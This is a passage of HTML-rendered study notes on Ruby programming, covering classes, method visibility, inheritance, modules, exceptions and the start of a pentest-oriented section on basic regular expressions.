    <span class="vi">@x</span><span class="p">,</span> <span class="vi">@y</span> <span class="o">=</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">+</span><span class="p">(</span><span class="n">other</span><span class="p">)</span>
    <span class="vi">@x</span> <span class="o">+=</span> <span class="n">other</span><span class="p">.</span><span class="nf">x</span>
    <span class="vi">@y</span> <span class="o">+=</span> <span class="n">other</span><span class="p">.</span><span class="nf">y</span>
    <span class="nb">self</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<ul>
  <li>The <strong>+</strong> operator changes the first object and returns it as a result.</li>
  <li>A Point value can change its coordinate values using both the setters and <strong>+</strong> operation.</li>
</ul>

<h2 id="method-visibility">Method Visibility</h2>
<ul>
  <li>Ruby allows u to define protected and private methods too</li>
</ul>

<h3 id="private-methods">Private Methods</h3>
<ul>
  <li>u can define private instance methods and private class methods</li>
  <li>Private instance methods can only be called by other instance methods of the class (and subclass). You cannot call them from outside an object.</li>
</ul>

<p>A famous Ruby private instance method is <strong>initialize</strong>. U cannot call it from outside:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">obj</span><span class="p">.</span><span class="nf">initialize</span> <span class="o">&gt;</span> <span class="n">error</span>
</code></pre></div></div>

<ul>
  <li>
    <p><strong>initialize</strong> is an exception because in Ruby all methods are public by default</p>
  </li>
  <li>
    <p>Private instance methods are defined using the <strong>private</strong> keyword. With used without arguments, all the methods bellow this keyword are private</p>
  </li>
</ul>

<p>Example 1:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AClass</span>
  <span class="c1"># Public methods</span>
  <span class="k">def</span> <span class="nf">getName</span>
    <span class="n">privateName</span>
  <span class="k">end</span>

  <span class="kp">private</span>
  <span class="c1"># Private methods below</span>
  <span class="k">def</span> <span class="nf">privateName</span>
    <span class="s2">"I'm AClass"</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<p>Example 2:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># u can specify which methods to treat as private</span>

<span class="k">class</span> <span class="nc">AClass</span>
  <span class="c1"># Public methods</span>
  <span class="k">def</span> <span class="nf">getName</span>
    <span class="n">privateName</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">privateName</span>
    <span class="s2">"I'm AClass"</span>
  <span class="k">end</span>

  <span class="c1"># Specify private methods</span>
  <span class="kp">private</span> <span class="ss">:privateName</span>
<span class="k">end</span>

</code></pre></div></div>

<ul>
  <li>if u want to specify class methods as private</li>
  <li>u can use the <strong>private_class_method</strong> keyword</li>
</ul>

<h3 id="protected-methods">Protected Methods</h3>
<ul>
  <li>Protected methods work as private methods but protected methods may be called by any instance of the defining class or its subclasses.</li>
</ul>

<h3 id="a-full-view">A full view</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">ComplexClass</span>
  <span class="c1"># Public instance methods</span>

  <span class="kp">protected</span>
  <span class="c1"># Protected instance methods</span>

  <span class="kp">private</span>
  <span class="c1"># Private instance methods</span>

  <span class="k">class</span> <span class="o">&lt;&lt;</span> <span class="nb">self</span>
    <span class="c1"># Public class methods</span>

    <span class="kp">protected</span>
    <span class="c1"># Protected class methods</span>

    <span class="kp">private</span>
    <span class="c1"># Private class methods</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<ul>
  <li>Private methods is not a secure way to hide something. A different technique such as meta-programming (via send method) or reflection API allows to bypass private/protected methods</li>
</ul>

<p>→  moreover reflection API = http://en.wikipedia.org/wiki/Reflection_(computer_programming)</p>

<h2 id="subclassing--inheritance">Subclassing &amp; Inheritance</h2>

<ul>
  <li>A mechanism to extend a class in order to modify its behavior or add new functionalities: subclassing</li>
  <li>A class may have multiple subclasses but classes in general can only extend one class (a class has only one superclass).</li>
  <li>When u define a new class, if nothing is specified, it automatically extends the Object Class.</li>
  <li>The Objec Class extends another Ruby utility Class: BasicObject</li>
  <li>Therefore the root class in Ruby is BasicObject</li>
</ul>

<h3 id="simple-extensions">Simple extensions</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="no">Extending</span> <span class="n">a</span> <span class="k">class</span> <span class="n">is</span> <span class="n">very</span> <span class="n">simple</span><span class="p">,</span> <span class="n">just</span> <span class="n">use</span> <span class="n">the</span> <span class="o">**&lt;**</span> <span class="n">operator</span><span class="p">.</span> 
<span class="nf">-</span> <span class="no">A</span> <span class="k">class</span> <span class="n">inherits</span> <span class="n">all</span> <span class="n">superclass</span> <span class="nb">methods</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Person</span>
  <span class="nb">attr_reader</span> <span class="ss">:name</span>

  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
    <span class="vi">@name</span> <span class="o">=</span> <span class="nb">name</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="k">class</span> <span class="nc">Italian</span> <span class="o">&lt;</span> <span class="no">Person</span>
<span class="k">end</span>

<span class="n">marco</span> <span class="o">=</span> <span class="no">Italian</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"Marco"</span><span class="p">)</span>
<span class="nb">puts</span> <span class="n">marco</span><span class="p">.</span><span class="nf">name</span>
<span class="c1"># Output: Marco</span>

</code></pre></div></div>

<h3 id="methods-overriding">Methods Overriding</h3>
<ul>
  <li>subclassing is Ruby is strongly discouraged if u do not properly know the superclass that u want to extend</li>
  <li>u might override some private methods that are fundamental For the class to work properly</li>
  <li>To override a method, simply define it in the subclass.</li>
  <li>A common overridden method is <strong>to_s</strong> = to string</li>
</ul>

<p>By default a class extends the Object class and that to_s is a method that Object class hold:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Italian</span> <span class="o">&lt;</span> <span class="no">Person</span>
  <span class="k">def</span> <span class="nf">to_s</span>
    <span class="s2">"Sono </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
  <span class="k">end</span>
<span class="k">end</span>


<span class="n">marco</span> <span class="o">=</span> <span class="no">Italian</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"Marco"</span><span class="p">)</span>
<span class="n">marco</span><span class="p">.</span><span class="nf">to_s</span>
<span class="c1"># Output: Sono Marco</span>
</code></pre></div></div>

<h3 id="specialize-a-method">Specialize a Method</h3>
<ul>
  <li>the <strong>super</strong> keyword help us avoid the complete redefinition of method behavior</li>
  <li>with super, u can call the method of the superclass</li>
</ul>

<p>u can use super with or without arguments:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Vehicle</span>
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">type</span><span class="p">)</span>
    <span class="vi">@type</span> <span class="o">=</span> <span class="n">type</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">to_s</span>
    <span class="s2">"I'm a </span><span class="si">#{</span><span class="vi">@type</span><span class="si">}</span><span class="s2"> vehicle"</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="k">class</span> <span class="nc">Car</span> <span class="o">&lt;</span> <span class="no">Vehicle</span>
  <span class="k">def</span> <span class="nf">initialize</span>
    <span class="k">super</span><span class="p">(</span><span class="s2">"land"</span><span class="p">)</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">to_s</span>
    <span class="k">super</span> <span class="o">+</span> <span class="s2">". I'm a car"</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<h3 id="instance-and-class-variables">Instance and Class Variables</h3>

<ul>
  <li>Inheritance does not affect instance variables</li>
  <li>Class variables are shared and visible from instance methods, class methods and by the class definition itself.</li>
</ul>

<h3 id="constants-1">Constants</h3>
<ul>
  <li>They are inherited and they can be overridden</li>
  <li>when u try to override an inherited constant, Ruby creates a new one with the same name but available only For the subclass.</li>
</ul>

<h3 id="private-methods-1">Private methods</h3>
<ul>
  <li>Private methods can be used inside inherited classes</li>
  <li>Private methods are inherited</li>
</ul>

<h3 id="protected-methods-1">Protected methods</h3>
<ul>
  <li>They are inherited and can be used similar to private methods</li>
  <li>The difference is that you have to use them in an explicit way (object.method notation) when used inside (and not outside) a class or subclass.</li>
</ul>

<h2 id="modules">Modules</h2>

<ul>
  <li>http://ruby-doc.org/core-1.9.3/Module.html</li>
  <li>its used to define namespaces and mixins.</li>
  <li>A module is essentially a collection of methods, constants and class variables with a name.</li>
  <li>The main difference between classes and modules:
 → Modules cannot be instantiated
 → They cannot be subclassed, therefore there is not a module hierarchy</li>
</ul>

<h3 id="namespace">Namespace</h3>
<ul>
  <li>Is a way to collect and bind related methods and constants, giving them a name that helps u to use them.</li>
  <li>http://ruby-doc.org/core-2.1.0/Math.html</li>
  <li>Math is the most suitable example of modules used as namespace</li>
  <li>Its a collection of mathematical constants (PI and E) and methods, especially For basic trigonometric and transcendental functions.</li>
  <li>Modules and namespaces allow u to define custom Libraries: collection of constants, classes, other modules and so on.</li>
</ul>

<h3 id="mixin">Mixin</h3>
<ul>
  <li>Mixin means that if a module defines instance methods (instead of class methods), those instance methods can be mixed into another class; the implementation of the class and the module are joined.</li>
  <li>To mix a module into a class, use the <strong>include</strong> keyword</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">module</span> <span class="nn">B</span>
  <span class="k">def</span> <span class="nf">hello</span><span class="p">;</span> <span class="s2">"Hello"</span><span class="p">;</span> <span class="k">end</span>
<span class="k">end</span>

<span class="k">class</span> <span class="nc">A</span>
  <span class="kp">include</span> <span class="no">B</span>
  <span class="k">def</span> <span class="nf">world</span><span class="p">;</span> <span class="s2">"World"</span><span class="p">;</span> <span class="k">end</span>
<span class="k">end</span>

<span class="n">obg</span> <span class="o">=</span> <span class="no">A</span><span class="p">.</span><span class="nf">new</span>

<span class="nb">print</span> <span class="n">obj</span><span class="p">,</span><span class="n">hello</span><span class="p">,</span> <span class="s2">" "</span><span class="p">,</span> <span class="n">obj</span><span class="p">.</span><span class="nf">world</span>
<span class="c1"># Output: Hello World =&gt;nil</span>
</code></pre></div></div>

<ul>
  <li>Two useful Ruby modules designed For mixin are <strong>Comparable</strong> and <strong>Enumerable</strong></li>
  <li>if your class defines the operator &lt;=&gt;, u can include Comparable to get free operation like:</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'&lt;'</span><span class="p">,</span><span class="s1">'&lt;='</span><span class="p">,</span><span class="s1">'=='</span><span class="p">,</span><span class="s1">'&gt;'</span><span class="p">,</span><span class="s1">'&gt;='</span> <span class="ow">and</span> <span class="n">between?</span>
</code></pre></div></div>

<ul>
  <li>If Enumerable is mixed with your class, it gives u <strong>sort</strong>, <strong>find</strong>, <strong>min</strong>, <strong>max</strong>, etc… without the need to implement them</li>
  <li>The Ruby platform provides other usable classes as well. Each one requires that your target class implements some methods in order to work correctly.</li>
</ul>

<h3 id="namespace-and-mixin-together">Namespace and Mixin Together</h3>
<ul>
  <li>Nothing prevents the use of a module both as a namespace and as a mixin; just provide both instance and class methods to the module</li>
</ul>

<p>Math For example: once we include Math, we do not need to specify <strong>Math::</strong> to access its contants, methods and so on</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Math</span><span class="o">::</span><span class="no">PI</span>
<span class="c1"># Output: 3,14</span>
<span class="no">Math</span><span class="o">::</span><span class="no">E</span>
<span class="c1"># Output: 2.71</span>
<span class="no">Math</span><span class="o">::</span><span class="n">sqrt</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span>
<span class="c1"># Output: 5.0</span>

<span class="kp">include</span> <span class="no">Math</span>
<span class="no">Object</span>
<span class="no">PI</span>
<span class="c1"># Output: 3,14</span>
<span class="no">E</span>
<span class="c1"># Output: 2.71</span>
<span class="n">sqrt</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span>
<span class="c1"># Output: 5.0</span>
</code></pre></div></div>

<h2 id="exceptions">Exceptions</h2>
<ul>
  <li>http://ruby-doc.org/core-1.9.3/Exception.html</li>
  <li>we should provide some code to execute when theses errors happen in order to retrieve a correct execution flow.</li>
  <li>usually subclasses of exception are used to add information about the type of exception raised or to distinguish different exceptions.</li>
</ul>

<h3 id="raise">Raise</h3>
<ul>
  <li>Exception are objects but they are usually created with the method <strong>raise</strong> (instead of new).</li>
  <li><strong>Raise</strong> alone creates a RuntimeError</li>
</ul>

<h4 id="runtimeerror">RuntimeError</h4>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">raise</span> <span class="s2">"A runtime error"</span>
</code></pre></div></div>

<h3 id="other-errors">Other Errors</h3>
<p>With raise, you can specify the Error type too:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">→</span> <span class="k">raise</span> <span class="no">ArgumentError</span><span class="p">,</span> <span class="s2">"Invalid argument"</span>

<span class="k">def</span> <span class="nf">int_sum</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
  <span class="k">raise</span><span class="p">(</span><span class="no">ArgumentError</span><span class="p">,</span><span class="s2">"a isn't Int"</span><span class="p">)</span> <span class="k">if</span> <span class="o">!</span><span class="n">a</span><span class="p">.</span><span class="nf">is_a?</span><span class="no">Integer</span>
  <span class="k">raise</span><span class="p">(</span><span class="no">ArgumentError</span><span class="p">,</span><span class="s2">"b isn't Int"</span><span class="p">)</span> <span class="k">if</span> <span class="o">!</span><span class="n">b</span><span class="p">.</span><span class="nf">is_a?</span><span class="no">Integer</span>
  <span class="n">a</span> <span class="o">+</span> <span class="n">b</span>
<span class="k">end</span>

<span class="n">inst_sum</span> <span class="s2">"a"</span><span class="p">,</span><span class="mi">10</span>
<span class="c1"># Output: "a isn't Int"</span>
</code></pre></div></div>

<h3 id="custom-error">Custom Error</h3>
<ul>
  <li>ArgumentError, RuntimeError, ZeroDivisionError are subclasses of StandardError</li>
  <li>Lets use <strong>NoIntError</strong></li>
  <li>First we define the new class NoIntError that is inherited from StandardError.</li>
</ul>

<p>Its our custom error class:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">NoIntError</span> <span class="o">&lt;</span> <span class="no">StandardError</span><span class="p">;</span> <span class="k">end</span><span class="p">;</span>

<span class="k">def</span> <span class="nf">int_sum</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
  <span class="k">raise</span><span class="p">(</span><span class="no">NoIntError</span><span class="p">,</span><span class="s2">"a isn't Int"</span><span class="p">)</span> <span class="k">if</span> <span class="o">!</span><span class="n">a</span><span class="p">.</span><span class="nf">is_a?</span><span class="no">Integer</span>
  <span class="k">raise</span><span class="p">(</span><span class="no">NoIntError</span><span class="p">,</span><span class="s2">"b isn't Int"</span><span class="p">)</span> <span class="k">if</span> <span class="o">!</span><span class="n">b</span><span class="p">.</span><span class="nf">is_a?</span><span class="no">Integer</span>
  <span class="n">a</span> <span class="o">+</span> <span class="n">b</span>
<span class="k">end</span>

<span class="n">inst_sum</span> <span class="s2">"a"</span><span class="p">,</span><span class="mi">10</span>
<span class="c1"># Output: "a isn't Int"</span>
</code></pre></div></div>

<h3 id="rescue">Rescue</h3>
<p>→ http://ruby-doc.org/core-1.9.3/Exception.html</p>
<ul>
  <li>If u want to handle an exception and execute some arbitrary code when it happens, you can use <strong>rescue</strong></li>
  <li>rescue is defined as a clause that can be attached to other statements (<strong>begin</strong> is the most common)</li>
</ul>

<h3 id="simple-rescue">Simple Rescue</h3>
<ul>
  <li><strong>$!</strong> refers to the last Exception object</li>
  <li>if u call the fact method with an integer less than 0, its executed infinite times because return statements are always false. Therefore at some point, the script spends all its memory.</li>
  <li>At some point, an exception is raised by Ruby because the stack is full. Rescue catches the exception object and global variable $! stores it.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">fact</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
  <span class="k">return</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">n</span><span class="o">==</span><span class="mi">0</span>
  <span class="k">return</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">n</span><span class="o">==</span><span class="mi">1</span>
  <span class="n">n</span> <span class="o">*</span> <span class="n">fact</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="k">end</span>
<span class="k">begin</span>
  <span class="n">a</span><span class="o">=</span><span class="n">fact</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">to_i</span><span class="p">)</span>
  <span class="nb">p</span> <span class="n">a</span>
<span class="k">rescue</span>
  <span class="nb">p</span> <span class="vg">$!</span><span class="p">.</span><span class="nf">message</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="exception-objects">Exception Objects</h3>
<ul>
  <li><strong>$!</strong> refers to the last exception object. u can use a personal variable with rescure.</li>
  <li>In the example, we use <strong>exc</strong> instead of <strong>$!</strong></li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">fact</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
  <span class="k">return</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">n</span><span class="o">==</span><span class="mi">0</span>
  <span class="k">return</span> <span class="mi">1</span> <span class="k">if</span> <span class="n">n</span><span class="o">==</span><span class="mi">1</span>
  <span class="n">n</span> <span class="o">*</span> <span class="n">fact</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="k">end</span>
<span class="k">begin</span>
  <span class="n">a</span><span class="o">=</span><span class="n">fact</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">to_i</span><span class="p">)</span>
  <span class="nb">p</span> <span class="n">a</span>
<span class="k">rescue</span> <span class="o">=&gt;</span> <span class="n">exc</span>
  <span class="nb">p</span> <span class="n">exc</span><span class="p">.</span><span class="nf">message</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="type-based-exception-handling">Type based exception handling</h3>
<ul>
  <li>U can handle exceptions by their type:
```ruby</li>
</ul>

<p>def int_sum(a,b)
  raise TypeError if !(a.is_a?Integer)
  raise TypeError if !(b.is_a?Integer)
  a + b
end</p>

<p>begin
  print “2 + 3 = “.int_sum(2,3),”\n”
  print int_sum(2) if ARGV[0] == “argument”
  print int_sum(“a”,10) if ARGV[0] == “type”
rescue ArgumentError =&gt; ae
  print “ArgumentError rescue: “
  print ae.message, “\n”
rescue TypeError =&gt; te
  print “TypeError rescue: “
  print te.message,”\n”
end</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
&gt; Rescue can follow any statement. If an exception occurs, the body of rescue is executed.

### Other Clause
```ruby
- retry
- else
- ensure
</code></pre></div></div>

<h3 id="retry">Retry</h3>
<ul>
  <li>its a clause that can be used inside a rescue clause to re-execute the block of code that has caused the exception.</li>
  <li>Imagine that u want to update a db and an exception occurs (a network error, a DB error, etc). U may try again (the network may be available later).</li>
  <li>with <strong>retry</strong> u can do that</li>
  <li>example: ZeroDIvisionError</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">to_i</span>
<span class="n">b</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>

<span class="k">begin</span>
  <span class="nb">print</span> <span class="s2">"</span><span class="si">#{</span><span class="n">a</span><span class="si">}</span><span class="s2"> / </span><span class="si">#{</span><span class="n">b</span><span class="si">}</span><span class="s2"> = "</span>
  <span class="nb">print</span> <span class="n">a</span> <span class="o">/</span> <span class="n">b</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
<span class="k">rescue</span>
  <span class="nb">print</span> <span class="s2">"Error</span><span class="se">\n</span><span class="s2">"</span>
  <span class="n">b</span><span class="o">=</span><span class="mi">1</span>
  <span class="k">retry</span>
<span class="k">end</span>
</code></pre></div></div>

<ul>
  <li>Be careful when using <strong>retry</strong>, cause it can cause a infinite loop</li>
</ul>

<h3 id="else">Else</h3>
<ul>
  <li>Its used to execute some arbitrary code when rescue does not catch any exception</li>
  <li><strong>else</strong> may be put after a <strong>rescue</strong> clause.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">begin</span>
  <span class="c1"># code</span>
<span class="k">rescue</span>
  <span class="c1"># code</span>
<span class="k">else</span>
  <span class="c1"># code</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="ensure">Ensure</h3>
<ul>
  <li>its used to specify some code that is always executed at the end of the begin flow.</li>
  <li>The code is always executed even if an exception occurs inside the main control flow.</li>
  <li><strong>ensure</strong> may be inserted after all <strong>rescue</strong> and <strong>else</strong> clauses.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">begin</span>
  <span class="c1"># normal flow</span>
<span class="k">rescue</span>
  <span class="c1"># exception handling</span>
<span class="k">else</span>
  <span class="c1"># no exception occur</span>
<span class="k">ensure</span>
  <span class="c1"># always executed</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="methods-classes-and-modules">Methods, Classes and Modules</h3>
<ul>
  <li>U can use all the previous concepts and clauses with methods, classes and modules as well without the need of <strong>begin</strong> keyword</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">my_method</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">)</span>
  <span class="c1"># normal flow</span>
<span class="k">rescue</span> 
  <span class="c1"># exception handling</span>
<span class="k">else</span>
  <span class="c1"># no exception occur</span>
<span class="k">ensure</span>
  <span class="c1"># always executed</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="ruby-is-much-more">Ruby is much more</h3>
<p>There are many other statements, techniques and features:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">→</span> <span class="no">Proc</span> <span class="ow">and</span> <span class="no">Lamba</span> <span class="n">abstraction</span>
<span class="err">→</span> <span class="no">Closures</span>
<span class="err">→</span> <span class="no">Functional</span> <span class="n">programming</span> <span class="ow">and</span> <span class="n">higher</span> <span class="n">order</span> <span class="n">function</span>
<span class="err">→</span> <span class="no">Reflection</span>
<span class="err">→</span> <span class="no">Metaprogamming</span>
</code></pre></div></div>

<h1 id="pentest">Pentest</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Regular Expressions

Dates and Time

Files and Directories

File Stream

Working with Nmap Files
</code></pre></div></div>

<h2 id="regular-expressions">Regular Expressions</h2>

<ul>
  <li>Its a set of characters that describes a search pattern</li>
  <li>usually a pentester uses regular expressions to filter and extract information in documents, client-server communications, tools output, and much more.</li>
  <li>For example, we can use them to extract all the email addresses of a web page as well as filter nmap results.</li>
  <li>From a defensive pov, regular expressions are also commonly used to verify and sanitize inputs. This may be used to avoid the input having bad character or invalid text.</li>
</ul>

<h3 id="basic-concepts">Basic Concepts</h3>
<ul>
  <li>A regular expression (regex or regexp) is usual delimited by forward slash in all languages:
 /regex body/</li>
  <li>example:</li>
  <li>The <strong>=~</strong> is the Ruby basic pattern matching operator. It returns nil if the string does not contain the pattern; otherwise it returns the index where the first match begins</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/World/</span>
<span class="c1"># Output: 6</span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/Torld/</span>
<span class="c1"># Output: nil</span>
</code></pre></div></div>

<h3 id="regexp-object">Regexp Object</h3>
<ul>
  <li>regex are instances of the regex class; therefore they are regex objects</li>
</ul>

<p>u can create a regex object with:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">literal</span> <span class="n">notation</span> <span class="p">(</span> <span class="o">**</span><span class="sr">/pattern/</span><span class="o">**</span> <span class="p">)</span>
<span class="o">**</span><span class="sr">%r**</span> <span class="n">notation</span>
<span class="no">OO</span> <span class="n">notation</span>
</code></pre></div></div>

<p>Delimiters are custom:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/hello/</span> <span class="o">=</span> <span class="n">literal</span> <span class="n">notation</span>
<span class="sr">%r{hello}</span> <span class="o">=</span> <span class="p">{}</span> <span class="n">delimiters</span>
<span class="sr">%r!hello!</span> <span class="o">=</span> <span class="o">!</span> <span class="n">delimiter</span>
</code></pre></div></div>

<p>OO notation just use <strong>new</strong> or <strong>compile</strong> as synonym For regex.new:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Regexp</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"hello"</span><span class="p">)</span>
<span class="no">Regexp</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="s2">"hello"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="regexp-modifier">Regexp Modifier</h3>
<ul>
  <li>u can add flags to specify additional information about the matching that has to be performed</li>
  <li><strong>i</strong> is used For case insensitive matching. when add after the last <strong>/</strong> it returns the index of the match</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/hello/i</span>
<span class="c1"># Output: 0</span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="sr">/world/i</span>
<span class="c1"># Output: 6</span>
</code></pre></div></div>

<ul>
  <li>with OO notation, u have to specify the attribute</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span> <span class="o">=</span> <span class="no">Regexp</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"hello"</span><span class="p">,</span><span class="no">Regexp</span><span class="o">::</span><span class="no">IGNORECASE</span><span class="p">)</span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="n">reg</span>
<span class="c1"># Output: 0</span>
	
<span class="n">reg</span> <span class="o">=</span> <span class="no">Regexp</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"world"</span><span class="p">,</span><span class="no">Regexp</span><span class="o">::</span><span class="no">IGNORECASE</span><span class="p">)</span>
<span class="s2">"Hello World"</span> <span class="o">=~</span><span class="n">reg</span>
<span class="c1"># Output: 6</span>
</code></pre></div></div>

<p>→ moreover = http://www.ruby-doc.org/core-1.9.3/Regexp.html</p>

<h3 id="match-method">Match method</h3>
<ul>
  <li>if u have a regexp object and u invoke match on a string, it gives u another object that describes the match (a MatchData object)</li>
  <li>with a matchData object, u can get some information about the matching such as the position of the matched substring, the matched words and much more.</li>
  <li>u can treat MatchData as an array - where at each position u can find the matching substring.</li>
</ul>

<p>//no matching</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">matching</span> <span class="o">=</span> <span class="sr">/world/</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="s2">"Hello World"</span><span class="p">)</span> <span class="c1"># because its case sensitive</span>
<span class="c1"># Output: nil</span>
<span class="n">matching</span> <span class="o">=</span> <span class="sr">/world/i</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="s2">"Hello World"</span><span class="p">)</span> <span class="c1"># with **i** flag, we disable the case sensitive and have a match</span>
<span class="c1"># Output: &lt;MatchData "World"&gt;</span>
<span class="n">matching</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="c1"># Output: "World"</span>
<span class="n">matching</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="c1"># Output: nil</span>
<span class="n">matching</span><span class="p">.</span><span class="nf">begin</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1"># Output: 6</span>
</code></pre></div></div>

<h3 id="special-characters">Special Characters</h3>
<p>Characters w/ special meaning:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">()</span> <span class="p">[]</span> <span class="p">{}</span> <span class="o">.</span> <span class="p">?</span> <span class="o">+</span> <span class="o">|</span> <span class="o">^</span> <span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>To use them, u have to use a backslash <em>**</em> in order to escape them.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Hello World)"</span> <span class="o">=~</span><span class="sr">/\(/</span> 
<span class="c1"># Output: 12</span>
<span class="s2">"Where are you from?"</span> <span class="o">=~</span><span class="sr">/\?/</span>
<span class="c1"># Output: 18</span>
</code></pre></div></div>

<h3 id="regular-expression-syntax">Regular Expression Syntax</h3>

<table>
  <tbody>
    <tr>
      <td>Rule</td>
      <td>Matching</td>
    </tr>
    <tr>
      <td>.</td>
      <td>A single character (it does not match newline)</td>
    </tr>
    <tr>
      <td>[]</td>
      <td>At least one of the character in square brackets</td>
    </tr>
